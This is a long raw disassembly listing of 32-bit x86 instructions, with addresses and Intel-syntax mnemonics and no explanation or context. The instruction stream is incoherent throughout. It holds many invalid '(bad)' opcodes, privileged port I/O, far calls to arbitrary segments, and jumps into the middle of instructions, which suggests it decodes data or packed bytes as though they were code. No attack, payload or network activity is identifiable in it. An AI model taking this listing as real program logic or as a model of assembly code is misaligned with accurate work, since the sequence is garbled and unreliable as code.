  4966ce:	js     0x4966c8
  4966d0:	gs popa 
  4966d2:	xor    BYTE PTR [edi],0x40
  4966d5:	and    BYTE PTR [ecx],bl
  4966d7:	pushf  
  4966d8:	cmp    eax,0x77d89428
  4966dd:	jle    0x4966b2
  4966df:	rcl    BYTE PTR [eax-0x4c],0x6a
  4966e3:	add    ebx,ebx
  4966e5:	inc    eax
  4966e6:	ret    0x5125
  4966e9:	sbb    al,0x3a
  4966eb:	sar    BYTE PTR [edx-0x56368ef8],cl
  4966f1:	sti    
  4966f2:	clc    
  4966f3:	cmp    edi,DWORD PTR [eax]
  4966f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4966f6:	push   eax
  4966f7:	rol    BYTE PTR [ecx],0x14
  4966fa:	nop
  4966fb:	dec    ebp
  4966fc:	xchg   esp,eax
  4966fd:	mov    eax,ds:0x4890b506
  496702:	or     dl,BYTE PTR [edx+0x7b7b4c00]
  496708:	arpl   WORD PTR [esi],bx
  49670a:	enter  0x488b,0x6
  49670e:	or     dh,al
  496710:	jmp    0x496699
  496712:	add    ch,BYTE PTR [esi-0x1c7eff58]
  496718:	xchg   esi,eax
  496719:	sub    ebx,0x81803fff
  49671f:	add    al,0x38
  496721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496722:	call   0x81b8:0x7e22e860
  496729:	sti    
  49672a:	add    eax,eax
  49672c:	adc    BYTE PTR [edi],ah
  49672e:	out    dx,al
  49672f:	fst    DWORD PTR [edx+0x42]
  496732:	js     0x496762
  496734:	pop    esp
  496735:	test   DWORD PTR [eax+0x45],ecx
  496738:	repz rcr BYTE PTR [esi],0x7a
  49673c:	jl     0x496732
  49673e:	sbb    bl,BYTE PTR [eax-0x2]
  496741:	outs   dx,DWORD PTR ds:[esi]
  496742:	(bad)  
  496743:	fiadd  DWORD PTR [edx]
  496745:	aad    0xf5
  496747:	jle    0x4966f4
  496749:	stos   DWORD PTR es:[edi],eax
  49674a:	push   0x2
  49674c:	stos   DWORD PTR es:[edi],eax
  49674d:	pop    eax
  49674e:	pop    ds
  49674f:	xchg   esi,eax
  496750:	fcomp  QWORD PTR [ebx-0x40]
  496753:	ins    DWORD PTR es:[edi],dx
  496754:	cmp    eax,DWORD PTR [eax-0x5a1bd510]
  49675a:	add    BYTE PTR [ebx+0x3821083d],cl
  496760:	ins    BYTE PTR es:[edi],dx
  496761:	mov    al,ds:0x825e4f6c
  496766:	pop    ebp
  496767:	adc    bl,0xee
  49676a:	pop    ds
  49676b:	sbb    al,0x57
  49676d:	add    DWORD PTR [ecx+0x16bff14],eax
  496773:	pop    ds
  496774:	pusha  
  496775:	pop    ebp
  496776:	lods   al,BYTE PTR ds:[esi]
  496777:	jns    0x49677e
  496779:	dec    edx
  49677a:	or     edx,0xffffffe0
  49677d:	inc    edx
  49677e:	lea    esi,[esi+0x74b6022f]
  496784:	mov    dl,0x6a
  496786:	pop    ds
  496787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  496788:	sub    ecx,edx
  49678a:	inc    eax
  49678b:	shl    eax,cl
  49678d:	repnz rol BYTE PTR [ebp+0x2b566ff9],1
  496794:	pop    edx
  496795:	test   BYTE PTR [ebp-0x357cbb0d],cl
  49679b:	call   ebx
  49679d:	loop   0x496796
  49679f:	rol    BYTE PTR [ebp-0x79e57eac],cl
  4967a5:	mov    ebp,0x7c8305eb
  4967aa:	or     al,BYTE PTR [edx+0x7]
  4967ad:	mov    edi,0xf3f8489b
  4967b2:	jmp    0x496822
  4967b4:	shr    BYTE PTR [ecx+ebx*2+0x23],0xd1
  4967b9:	mov    ch,0x81
  4967bb:	out    0x10,eax
  4967bd:	sbb    edi,DWORD PTR [ebx+esi*2-0x51]
  4967c1:	mov    ds:0xe0cf834f,al
  4967c6:	inc    edi
  4967c7:	adc    DWORD PTR [ebx],ebp
  4967c9:	iret   
  4967ca:	inc    ebp
  4967cb:	mov    esp,0x76682e6d
  4967d0:	lea    ecx,[esi+eiz*2-0x75]
  4967d4:	cmp    DWORD PTR [ebx],eax
  4967d6:	cli    
  4967d7:	mov    BYTE PTR [ecx],0x6e
  4967da:	dec    ebp
  4967db:	ds or  al,0x39
  4967de:	or     BYTE PTR [edx+0x22],dh
  4967e1:	cmp    DWORD PTR [edx-0x60f7bee5],ebx
  4967e7:	sub    ecx,DWORD PTR [esi]
  4967e9:	sub    ecx,DWORD PTR [ebx+0x3d]
  4967ec:	adc    DWORD PTR [ecx],eax
  4967ee:	fld    TBYTE PTR [ebx]
  4967f0:	ret    0x7e56
  4967f3:	cli    
  4967f4:	jb     0x4967ba
  4967f6:	inc    DWORD PTR [ecx]
  4967f8:	loope  0x4967fb
  4967fa:	sahf   
  4967fb:	lock fmul QWORD PTR [bx+si-0x6c]
  496800:	mov    DWORD PTR [ecx],edx
  496802:	js     0x496854
  496804:	pop    eax
  496805:	inc    ecx
  496806:	sar    BYTE PTR [ecx-0x2f],1
  496809:	add    cl,BYTE PTR [ebx+0x2e216080]
  49680f:	dec    eax
  496810:	ds pop esp
  496812:	add    eax,0x2120b062
  496817:	push   es
  496818:	xor    ah,BYTE PTR [ebp+edi*2+0xa]
  49681c:	lea    eax,[ebx]
  49681e:	pop    eax
  49681f:	sub    DWORD PTR ds:0xf3f62b22,ebx
  496825:	stos   DWORD PTR es:[edi],eax
  496826:	push   0xde1fe12c
  49682b:	je     0x49682e
  49682d:	inc    ebx
  49682e:	mov    eax,ds:0xd791104
  496833:	icebp  
  496834:	loope  0x4967bc
  496836:	aaa    
  496837:	idiv   DWORD PTR [ebx]
  496839:	fnstcw WORD PTR [ebp+0xd]
  49683c:	inc    edi
  49683d:	stos   DWORD PTR es:[edi],eax
  49683e:	inc    eax
  49683f:	std    
  496840:	adc    edx,edi
  496842:	enter  0x8150,0x20
  496846:	(bad)  
  496847:	pop    edx
  496848:	sub    eax,DWORD PTR [ebp-0x2c]
  49684b:	xor    bh,BYTE PTR [ebx+edx*2]
  49684e:	mov    esp,edx
  496850:	dec    esp
  496851:	xor    al,0xa5
  496853:	cmp    DWORD PTR [ebx],ebx
  496855:	sub    cl,BYTE PTR ds:0x89d15a1a
  49685b:	loop   0x496802
  49685d:	das    
  49685e:	test   BYTE PTR [edi],al
  496860:	mov    BYTE PTR ds:0x4a00d83e,al
  496866:	xchg   esi,eax
  496867:	jle    0x496877
  496869:	pop    esi
  49686a:	push   ds
  49686b:	mov    ecx,edx
  49686d:	shl    edi,cl
  49686f:	sub    ah,BYTE PTR [eax]
  496871:	sub    DWORD PTR [ebp-0x24],edx
  496874:	or     bl,BYTE PTR [edi-0x10]
  496877:	push   ebp
  496878:	sbb    BYTE PTR [ebp-0x20],bl
  49687b:	lea    ebx,[ebp+ebx*4+0x72]
  49687f:	xor    ecx,DWORD PTR [ebx+0xbcf23ce]
  496885:	cmp    BYTE PTR [eax+0x22],bh
  496888:	cmp    BYTE PTR [esi],0xee
  49688b:	push   eax
  49688c:	or     ebx,DWORD PTR [eax]
  49688e:	cmp    BYTE PTR [eax+0x53],0x98
  496892:	and    al,0x75
  496894:	aam    0xd3
  496896:	out    0x3e,al
  496898:	ret    0xa949
  49689b:	sub    eax,0x208903a2
  4968a0:	jl     0x4968a8
  4968a2:	or     dl,BYTE PTR [edi]
  4968a4:	push   edx
  4968a5:	mov    edx,0x2e6c142
  4968aa:	js     0x496906
  4968ac:	sub    ecx,esi
  4968ae:	mov    al,0xe
  4968b0:	out    dx,eax
  4968b1:	push   eax
  4968b2:	cmp    BYTE PTR [ecx+esi*1],bl
  4968b5:	mov    DWORD PTR [ebp+edx*4-0x61],esi
  4968b9:	or     bh,BYTE PTR fs:[ecx-0x2f6fc03b]
  4968c0:	dec    edx
  4968c1:	jns    0x4968ac
  4968c3:	mov    esi,DWORD PTR ds:0x468d4e59
  4968c9:	cwde   
  4968ca:	push   esp
  4968cb:	dec    esp
  4968cc:	cs push esi
  4968ce:	push   edx
  4968cf:	rcr    BYTE PTR [edi-0x238ebe67],1
  4968d5:	inc    esi
  4968d6:	lods   eax,DWORD PTR ds:[esi]
  4968d7:	pop    esp
  4968d8:	out    dx,al
  4968d9:	test   DWORD PTR [ebx],edx
  4968db:	pop    edi
  4968dc:	push   ecx
  4968dd:	jl     0x4968f9
  4968df:	ror    DWORD PTR [ebp+0x66],1
  4968e2:	mov    eax,esi
  4968e4:	push   es
  4968e5:	aas    
  4968e6:	xor    ah,BYTE PTR [eax]
  4968e8:	out    0x4e,al
  4968ea:	or     esi,0xffffffe0
  4968ed:	inc    esi
  4968ee:	rol    DWORD PTR [ecx],0x86
  4968f1:	inc    edx
  4968f2:	pusha  
  4968f3:	call   0x29e1:0x5c314d26
  4968fa:	and    BYTE PTR [eax+0x16],dh
  4968fd:	cmp    edi,esi
  4968ff:	clc    
  496900:	cli    
  496901:	fsubr  DWORD PTR [esi]
  496903:	cs call 0xac828e0d
  496909:	fsubr  st,st(3)
  49690b:	pop    ds
  49690c:	pop    esp
  49690d:	push   ds
  49690e:	pop    ss
  49690f:	add    eax,0x72552bc2
  496914:	add    DWORD PTR [eax],esi
  496916:	repnz push edx
  496918:	(bad)  
  496919:	icebp  
  49691a:	aas    
  49691b:	sub    DWORD PTR [ebx+eax*1],esi
  49691e:	mov    ?,WORD PTR [ecx]
  496920:	mov    ecx,edi
  496922:	dec    eax
  496923:	jns    0x496903
  496925:	mov    eax,0x3c52e066
  49692a:	aam    0x21
  49692c:	adc    al,dl
  49692e:	cmc    
  49692f:	rcl    DWORD PTR [ebx-0x4f],0x30
  496933:	hlt    
  496934:	push   edx
  496935:	aas    
  496936:	mov    ecx,DWORD PTR ds:0x33c8c00c
  49693c:	test   al,0x8c
  49693e:	repnz fisttp WORD PTR [ebp-0x526cfeaf]
  496945:	mov    ds:0xa442dd61,al
  49694a:	icebp  
  49694b:	cmp    eax,0x6e6727c1
  496950:	das    
  496951:	cmp    ebx,DWORD PTR ds:0x8c0f0a00
  496957:	sub    ch,dl
  496959:	jo     0x496987
  49695b:	add    al,0x63
  49695d:	xor    DWORD PTR [esi],0x37a091d6
  496963:	adc    ecx,eax
  496965:	arpl   WORD PTR [ecx+0x72],ax
  496968:	jo     0x4968ea
  49696a:	cmp    bh,BYTE PTR [edi]
  49696c:	sbb    eax,0xf8034c14
  496971:	jnp    0x4969d3
  496973:	shl    BYTE PTR [eax+0x75],0x3
  496977:	daa    
  496978:	and    DWORD PTR [ebp-0x10],0x10c155ca
  49697f:	push   esi
  496980:	dec    ebp
  496981:	into   
  496982:	clc    
  496983:	add    bl,ch
  496985:	xchg   edx,eax
  496986:	out    0xd6,al
  496988:	push   eax
  496989:	jl     0x496918
  49698b:	or     BYTE PTR [ecx+ecx*1+0x23cf4c2e],bh
  496992:	into   
  496993:	dec    ecx
  496994:	out    dx,eax
  496995:	and    cl,BYTE PTR [ebx]
  496997:	inc    eax
  496998:	xor    al,bl
  49699a:	cmp    DWORD PTR [ecx+ebp*1-0x539d2b83],ecx
  4969a1:	adc    BYTE PTR [eax],al
  4969a3:	imul   eax,DWORD PTR [esi+0x68d07d53],0x1039183f
  4969ad:	dec    ebp
  4969ae:	lods   eax,DWORD PTR ds:[esi]
  4969af:	shl    ebx,cl
  4969b1:	test   al,cl
  4969b3:	jg     0x4969c5
  4969b5:	js     0x496992
  4969b7:	xchg   esi,eax
  4969b8:	cmp    DWORD PTR [ebx],ecx
  4969ba:	fld    DWORD PTR [edi]
  4969bc:	pop    eax
  4969bd:	aas    
  4969be:	or     eax,0x5d0b10da
  4969c3:	lock jo 0x4969b3
  4969c6:	xchg   BYTE PTR [esi+0x1],dl
  4969c9:	(bad)  
  4969ca:	int3   
  4969cb:	mov    ebx,esp
  4969cd:	pop    ecx
  4969ce:	add    al,0xfb
  4969d0:	or     DWORD PTR [eax+0x752abc69],ebx
  4969d6:	add    eax,0x65458022
  4969db:	loope  0x496966
  4969dd:	sbb    ecx,ebx
  4969df:	outs   dx,BYTE PTR ds:[esi]
  4969e0:	leave  
  4969e1:	adc    edx,eax
  4969e3:	mov    eax,ds:0x1fc00302
  4969e8:	mov    dl,BYTE PTR [edx+0x20a1018b]
  4969ee:	in     al,0x21
  4969f0:	sbb    DWORD PTR [ecx+0x202201c],ebx
  4969f6:	bound  esp,QWORD PTR [edx+0x2008ae48]
  4969fc:	xor    al,0x8d
  4969fe:	add    ah,ah
  496a00:	and    al,0x66
  496a02:	mov    edi,0x1c069028
  496a07:	das    
  496a08:	mov    al,ds:0x5260da18
  496a0d:	mov    ecx,0x1a74182c
  496a12:	sub    al,0x20
  496a14:	push   ebx
  496a15:	add    al,0x3
  496a17:	mov    eax,ds:0x904e8224
  496a1c:	sbb    al,0x28
  496a1e:	adc    BYTE PTR [esi-0x2f],dl
  496a21:	or     BYTE PTR [eax+0x5],ch
  496a24:	pop    ds
  496a25:	lods   al,BYTE PTR ds:[esi]
  496a26:	mov    esi,0xad800371
  496a2b:	or     esi,DWORD PTR [edi]
  496a2d:	out    0xd0,al
  496a2f:	jmp    0x496a3d
  496a31:	inc    esi
  496a32:	(bad)  
  496a33:	push   ss
  496a34:	loopne 0x4969df
  496a36:	sub    DWORD PTR [edi],esp
  496a38:	iret   
  496a39:	test   DWORD PTR [ebp+esi*2+0x2b6839f1],ecx
  496a40:	imul   esi,DWORD PTR [edi],0xd27578ca
  496a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496a47:	lock add ah,bh
  496a4a:	pop    ss
  496a4b:	sbb    ah,BYTE PTR ds:0x98a068a
  496a51:	mov    BYTE PTR [esi],cl
  496a53:	inc    esi
  496a54:	shr    BYTE PTR [edx+0x36],cl
  496a57:	xor    DWORD PTR [eax+edx*1+0x16848ac1],ebp
  496a5e:	ins    BYTE PTR es:[edi],dx
  496a5f:	int3   
  496a60:	mov    eax,0x4d385eb2
  496a65:	mov    ecx,0x2b5804e7
  496a6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496a6b:	retf   0xf008
  496a6e:	lock pop esp
  496a70:	sahf   
  496a71:	mov    ch,0xff
  496a73:	sub    al,BYTE PTR [esi-0x6a]
  496a76:	xchg   ebp,eax
  496a77:	adc    cl,BYTE PTR [edx+0x6cca3a12]
  496a7d:	inc    eax
  496a7e:	cs xchg ch,dh
  496a81:	imul   edi,edi,0x7
  496a84:	ror    BYTE PTR [edx],0x68
  496a87:	ss jmp 0x496a95
  496a8a:	cmp    cl,0x65
  496a8d:	je     0x496a9b
  496a8f:	or     BYTE PTR [ebp+0x33],al
  496a92:	aas    
  496a93:	and    DWORD PTR [eax+ecx*1-0x58],ebp
  496a97:	ror    BYTE PTR [eax+0x64],1
  496a9a:	cli    
  496a9b:	mov    esi,DWORD PTR [ebp-0x1]
  496a9e:	jg     0x496a22
  496aa0:	mov    es,WORD PTR [ebx]
  496aa2:	push   ebx
  496aa3:	mov    bl,BYTE PTR [eax]
  496aa5:	cmp    bl,BYTE PTR [ecx]
  496aa7:	pop    ebx
  496aa8:	jne    0x496aab
  496aaa:	dec    eax
  496aab:	mov    cl,BYTE PTR [edx]
  496aad:	inc    eax
  496aae:	inc    edx
  496aaf:	mov    BYTE PTR [ebp-0xa],al
  496ab2:	mov    ebp,0xd3050e08
  496ab7:	add    ebx,ecx
  496ab9:	out    dx,al
  496aba:	or     al,0xa9
  496abc:	adc    esi,ebp
  496abe:	call   0x7ab2839f
  496ac3:	push   ds
  496ac4:	and    BYTE PTR [ecx+0x561de5d6],0x41
  496acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496acc:	(bad)  
  496acd:	xchg   ebp,eax
  496ace:	add    ebx,DWORD PTR [esi+0x6e]
  496ad1:	scas   al,BYTE PTR es:[edi]
  496ad2:	inc    ecx
  496ad3:	mov    eax,0xb9214cf1
  496ad8:	jbe    0x496b06
  496ada:	or     BYTE PTR [edx+0x69],bl
  496add:	aaa    
  496ade:	xchg   esp,eax
  496adf:	and    eax,DWORD PTR [ebx+ebp*8]
  496ae2:	adc    DWORD PTR [eax],esi
  496ae4:	or     BYTE PTR [edx],ah
  496ae6:	popa   
  496ae7:	mov    eax,0x3d80eca0
  496aec:	xor    bl,ch
  496aee:	mov    al,0x22
  496af0:	paddusw mm3,QWORD PTR [edi]
  496af3:	add    al,BYTE PTR ds:0x858d1b1f
  496af9:	and    BYTE PTR [edx+0x3644b71c],cl
  496aff:	fsubp  st(6),st
  496b01:	push   esi
  496b02:	add    esi,edi
  496b04:	adc    eax,0x5e3ccc55
  496b09:	mov    bh,0x26
  496b0b:	adc    edi,DWORD PTR [ebx]
  496b0d:	lar    eax,WORD PTR [ecx*1+0x6f0f8125]
  496b15:	and    DWORD PTR [ebp-0x270d0ff7],eax
  496b1b:	(bad)  
  496b1c:	imul   eax,DWORD PTR [eax],0xf
  496b1f:	xor    DWORD PTR [ebp+esi*2+0x22],0x2d
  496b24:	dec    edx
  496b25:	dec    ecx
  496b26:	stos   DWORD PTR es:[edi],eax
  496b27:	xchg   ebp,ebx
  496b29:	add    eax,0xd62d6096
  496b2e:	cmp    al,dh
  496b30:	jbe    0x496b2e
  496b32:	mov    bh,0x6
  496b34:	mov    bh,0xd9
  496b36:	or     BYTE PTR [esi+edi*2],cl
  496b39:	add    eax,0xc0833468
  496b3e:	or     DWORD PTR [ecx],edi
  496b40:	inc    ebp
  496b41:	push   eax
  496b42:	jno    0x496afe
  496b44:	fs cmc 
  496b46:	ret    
  496b47:	push   edi
  496b48:	pop    esp
  496b49:	sbb    BYTE PTR [edi+0x20086039],bl
  496b4f:	pushf  
  496b50:	ss dec esi
  496b52:	setg   BYTE PTR [ebx-0x29]
  496b56:	inc    ebx
  496b57:	mov    bh,0xc0
  496b59:	mov    ah,0x83
  496b5b:	cmp    ch,BYTE PTR ds:0x12cbee02
  496b61:	mov    edi,0x9d034041
  496b66:	jnp    0x496b82
  496b68:	cmp    DWORD PTR [edi],0x2d
  496b6b:	mov    esi,ebx
  496b6d:	jne    0x496b63
  496b6f:	push   cs
  496b70:	add    bh,dh
  496b72:	push   es
  496b73:	mov    BYTE PTR [ebx],0x2d
  496b76:	lea    esi,[ebx+0x1]
  496b79:	not    DWORD PTR ds:0xe3014e8a
  496b7f:	das    
  496b80:	push   esi
  496b81:	sbb    BYTE PTR [esi-0x4],cl
  496b84:	mov    eax,DWORD PTR [eax+0x8a0015]
  496b8a:	inc    esi
  496b8b:	jne    0x496bde
  496b8d:	pop    ss
  496b8e:	test   BYTE PTR [edx+eax*4],cl
  496b91:	sbb    BYTE PTR [eax],ah
  496b93:	add    ebp,DWORD PTR [edx]
  496b95:	add    BYTE PTR [esi-0x7a],cl
  496b98:	fdiv   QWORD PTR [edx+0x60]
  496b9b:	add    eax,0x8c8aa0c5
  496ba0:	ret    0x2baa
  496ba3:	jbe    0x496bad
  496ba5:	jbe    0x496bc1
  496ba7:	xadd   BYTE PTR [eax-0x2c],ch
  496bab:	mov    ds:0xc6507f56,al
  496bb0:	dec    edx
  496bb1:	adc    dh,dh
  496bb3:	imul   ebx,ebp,0x7bc8290
  496bb9:	mov    BYTE PTR [esi],0x45
  496bbc:	out    dx,eax
  496bbd:	xor    bl,BYTE PTR [edx+0x38]
  496bc0:	fdiv   QWORD PTR [ebp+0x7948bc2f]
  496bc6:	push   es
  496bc7:	neg    DWORD PTR [ecx]
  496bc9:	push   edi
  496bca:	add    bh,al
  496bcc:	fadd   st,st(6)
  496bce:	inc    esi
  496bcf:	add    DWORD PTR ds:0x990b7c90,ebp
  496bd5:	dec    ebp
  496bd6:	and    al,al
  496bd8:	push   esi
  496bd9:	lods   al,BYTE PTR ds:[esi]
  496bda:	idiv   edi
  496bdc:	mov    edx,0xe90a1e78
  496be1:	int    0x5c
  496be3:	sub    cl,BYTE PTR [edx]
  496be5:	add    ecx,DWORD PTR [eax]
  496be7:	add    al,0xf6
  496be9:	add    eax,0xf0cb6ed4
  496bee:	popa   
  496bef:	push   ss
  496bf0:	pop    edi
  496bf1:	into   
  496bf2:	out    dx,al
  496bf3:	ret    
  496bf4:	or     eax,0xf75f01b
  496bf9:	push   0x3
  496bfb:	xor    BYTE PTR [eax+0x51],dl
  496bfe:	iret   
  496bff:	or     al,0x27
  496c01:	xchg   ecx,eax
  496c02:	mov    cl,0x15
  496c04:	push   es
  496c05:	xlat   BYTE PTR ds:[ebx]
  496c06:	add    eax,0xa866dfb
  496c0b:	or     dl,BYTE PTR [edi+0x2c]
  496c0e:	pop    ds
  496c0f:	adc    al,0x20
  496c11:	shl    DWORD PTR [eax+0x5bb86a16],1
  496c17:	mov    DWORD PTR [edi],eax
  496c19:	add    eax,0x51e428ec
  496c1e:	(bad)  
  496c1f:	call   0x3dd60250
  496c24:	outs   dx,BYTE PTR ds:[esi]
  496c25:	and    al,0x6f
  496c27:	mov    al,ds:0x970ad0df
  496c2c:	mov    ebx,0x42878821
  496c31:	mov    ds:0xe92f6df6,eax
  496c36:	jne    0x496ca8
  496c38:	pop    eax
  496c39:	das    
  496c3a:	aam    0x4
  496c3c:	or     eax,DWORD PTR [esi-0x24deda6e]
  496c42:	inc    ecx
  496c43:	lock xchg ebp,eax
  496c45:	sub    eax,ecx
  496c47:	adc    al,0xee
  496c49:	outs   dx,DWORD PTR ds:[esi]
  496c4a:	jno    0x496bcd
  496c4c:	mov    ebx,0x1e69110
  496c51:	push   ecx
  496c52:	push   eax
  496c53:	adc    al,0x39
  496c55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496c56:	lea    edx,[eax-0x61ca3f4a]
  496c5c:	enter  0xec51,0x80
  496c60:	jne    0x496c3b
  496c62:	push   cs
  496c63:	and    ecx,DWORD PTR [ecx]
  496c65:	add    eax,0x121aebd6
  496c6a:	imul   edx,DWORD PTR [eax],0x5b
  496c6d:	jmp    0xcdb040b7
  496c72:	bound  eax,QWORD PTR [edx*2+0x21b2c7ba]
  496c79:	je     0x496c3f
  496c7b:	adc    BYTE PTR [esi-0x38e77fd6],dh
  496c81:	dec    esi
  496c82:	mov    ?,WORD PTR [ebx+0x58c5422d]
  496c88:	pop    es
  496c89:	and    DWORD PTR [edi+0x3e5e00e8],ecx
  496c8f:	and    al,0x56
  496c91:	push   edi
  496c92:	fadd   st(7),st
  496c94:	xchg   BYTE PTR [ebx],al
  496c96:	mov    dh,0x74
  496c98:	adc    BYTE PTR [eax+eax*2],0xf8
  496c9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  496c9d:	mov    eax,ds:0xabfe71f8
  496ca2:	cmp    esi,ecx
  496ca4:	cmp    bh,BYTE PTR [esi+0x11]
  496ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496ca8:	push   esp
  496ca9:	or     bl,cl
  496cab:	and    edi,DWORD PTR [ebp+0x397221f1]
  496cb1:	call   0x7a55019a
  496cb6:	js     0x496d18
  496cb8:	popa   
  496cb9:	pop    ss
  496cba:	lods   al,BYTE PTR ds:[esi]
  496cbb:	jbe    0x496c95
  496cbd:	dec    eax
  496cbe:	ror    BYTE PTR [ebx],0x4
  496cc1:	es jmp 0xb249ef6f
  496cc7:	adc    al,cl
  496cc9:	mov    ch,0xa8
  496ccb:	xor    al,0x9e
  496ccd:	cmp    BYTE PTR [esi],dl
  496ccf:	hlt    
  496cd0:	sahf   
  496cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496cd2:	(bad)  
  496cd3:	lods   al,BYTE PTR ds:[esi]
  496cd4:	fwait
  496cd5:	and    ch,cl
  496cd7:	adc    al,0xba
  496cd9:	jmp    0x30a4:0xca2353
  496ce0:	aam    0x94
  496ce2:	retf   0xc82
  496ce5:	(bad)  
  496ce6:	xor    dh,ah
  496ce8:	sub    ecx,DWORD PTR [edx-0x7cb496d9]
  496cee:	outs   dx,BYTE PTR ds:[esi]
  496cef:	and    DWORD PTR [eax],edx
  496cf1:	dec    BYTE PTR [esi+edx*4-0x674ff96c]
  496cf8:	pop    esi
  496cf9:	add    al,BYTE PTR [esi+0x8]
  496cfc:	pushf  
  496cfd:	mov    ebx,0xe8074cec
  496d02:	sbb    edi,edi
  496d04:	enter  0x64ae,0xb6
  496d08:	push   cs
  496d09:	xor    esp,DWORD PTR [esi]
  496d0b:	mov    cl,0x68
  496d0d:	pop    edi
  496d0e:	add    BYTE PTR [edx],cl
  496d10:	or     BYTE PTR [ecx+0x2c],bh
  496d13:	add    al,0x32
  496d15:	sub    eax,0x8baf0ffe
  496d1a:	rcr    BYTE PTR [eax],1
  496d1c:	inc    edx
  496d1d:	xor    BYTE PTR [eax-0x1fdb3702],ch
  496d23:	add    al,0x78
  496d25:	mov    BYTE PTR [esi+0x0],al
  496d28:	or     eax,0x62be0620
  496d2d:	pop    edi
  496d2e:	mov    eax,0x2f85cbb
  496d33:	and    DWORD PTR [ebp+edx*2-0x1d3b088],ecx
  496d3a:	leave  
  496d3b:	xor    BYTE PTR [eax-0x1e0513cd],0xe0
  496d42:	add    cl,0x70
  496d45:	ins    BYTE PTR es:[edi],dx
  496d46:	mov    BYTE PTR [eax+0x16],0x95
  496d4a:	push   0x25
  496d4c:	push   es
  496d4d:	jg     0x496d4e
  496d4f:	xor    ah,BYTE PTR [ebp-0x5e8b37f5]
  496d55:	mov    ebx,DWORD PTR [ebp+0x18]
  496d58:	inc    esi
  496d59:	inc    ecx
  496d5a:	jmp    0x496d4a
  496d5c:	ret    
  496d5d:	popf   
  496d5e:	neg    ebx
  496d60:	sbb    ebx,ebx
  496d62:	mov    esp,0xbc5ffaa
  496d67:	pop    esp
  496d68:	add    al,BYTE PTR [ebx-0xfed1f1d]
  496d6e:	jg     0x496d00
  496d70:	ret    
  496d71:	daa    
  496d72:	xor    edx,edx
  496d74:	or     eax,ecx
  496d76:	jne    0x496da4
  496d78:	adc    ebx,esp
  496d7a:	mov    ds:0x30026224,al
  496d7f:	xor    al,0xea
  496d81:	xor    bl,BYTE PTR [ecx]
  496d83:	dec    edi
  496d84:	ins    DWORD PTR es:[edi],dx
  496d85:	mov    esp,0x52a9cc4
  496d8a:	scas   eax,DWORD PTR es:[edi]
  496d8b:	lods   al,BYTE PTR ds:[esi]
  496d8c:	ret    
  496d8d:	sub    al,BYTE PTR [edx-0x15]
  496d90:	adc    dh,bl
  496d92:	(bad)  
  496d93:	jmp    0x496d9c
  496d95:	inc    eax
  496d96:	ins    BYTE PTR es:[edi],dx
  496d97:	fdivr  DWORD PTR [ebx+0x46]
  496d9a:	xor    DWORD PTR [eax],esi
  496d9c:	mov    ecx,DWORD PTR [esi]
  496d9e:	sub    BYTE PTR [eax+0x24],0x71
  496da2:	ins    DWORD PTR es:[edi],dx
  496da3:	js     0x496da9
  496da5:	jl     0x496db6
  496da7:	adc    ecx,DWORD PTR [ebx+eax*1]
  496daa:	sbb    al,0x3c
  496dac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496dad:	or     DWORD PTR [esi],ebx
  496daf:	mov    DWORD PTR [eax+0x14],eax
  496db2:	pop    eax
  496db3:	pop    eax
  496db4:	loop   0x496e2d
  496db6:	sub    BYTE PTR [ebx+0x16],dh
  496db9:	push   ecx
  496dba:	dec    BYTE PTR [edi]
  496dbc:	daa    
  496dbd:	xchg   esp,eax
  496dbe:	call   0x2c0e:0x1605b32a
  496dc5:	add    al,0x14
  496dc7:	dec    esp
  496dc8:	pop    ss
  496dc9:	sbb    ebx,DWORD PTR [ebp-0x37dc4a00]
  496dcf:	pop    es
  496dd0:	movsx  eax,WORD PTR [ecx+edi*4]
  496dd4:	or     eax,0xd2231a1d
  496dd9:	and    edx,0xb6aa8963
  496ddf:	icebp  
  496de0:	in     al,0x5c
  496de2:	cmp    dh,BYTE PTR [eax]
  496de4:	adc    dh,dh
  496de6:	push   ecx
  496de7:	fbstp  TBYTE PTR [ecx+0x3027639]
  496ded:	ret    
  496dee:	or     al,0x6d
  496df0:	cld    
  496df1:	shl    BYTE PTR [ebx],cl
  496df3:	add    ebp,DWORD PTR [ebx]
  496df5:	mov    esi,0xac0ff4d8
  496dfa:	enter  0x1a04,0x4
  496dfe:	inc    esi
  496dff:	push   cs
  496e00:	dec    eax
  496e01:	idiv   bl
  496e03:	push   ss
  496e04:	daa    
  496e05:	cmp    al,BYTE PTR [edx-0x3a]
  496e08:	jge    0x496db8
  496e0a:	sbb    DWORD PTR [ecx+edx*2-0x5b],edi
  496e0e:	or     DWORD PTR [edx],0x314e8108
  496e14:	cmc    
  496e15:	dec    eax
  496e16:	loopne 0x496e53
  496e18:	fimul  DWORD PTR [edx+0x66f98008]
  496e1e:	sub    al,BYTE PTR [esi-0x21]
  496e21:	jge    0x496e66
  496e23:	jmp    DWORD PTR [eax]
  496e25:	add    BYTE PTR [eax],dh
  496e27:	dec    eax
  496e28:	jmp    0x496e18
  496e2a:	mov    dl,BYTE PTR [ebp*1-0x7ff88ac7]
  496e31:	ret    
  496e32:	adc    eax,0x3a81ab82
  496e37:	and    al,0x9
  496e39:	inc    cl
  496e3b:	mov    WORD PTR [edx-0x14943d02],ds
  496e41:	rol    DWORD PTR [eax-0x1],0x53
  496e45:	adc    DWORD PTR [edx],edx
  496e47:	xor    BYTE PTR [esi-0x52],dl
  496e4a:	push   ds
  496e4b:	(bad)  
  496e4c:	xchg   ebp,eax
  496e4d:	mov    ebp,0xdad003
  496e52:	sbb    BYTE PTR [esi-0xfdbdf58],dh
  496e58:	sbb    esi,DWORD PTR [ecx+0x19decb34]
  496e5e:	shl    BYTE PTR [eax+0x70],0x48
  496e62:	in     ax,0x9d
  496e65:	les    edi,FWORD PTR ds:0x6925543a
  496e6b:	and    edx,ebx
  496e6d:	sub    ebp,DWORD PTR [ecx+ebx*2-0x44]
  496e71:	ss mov edi,eax
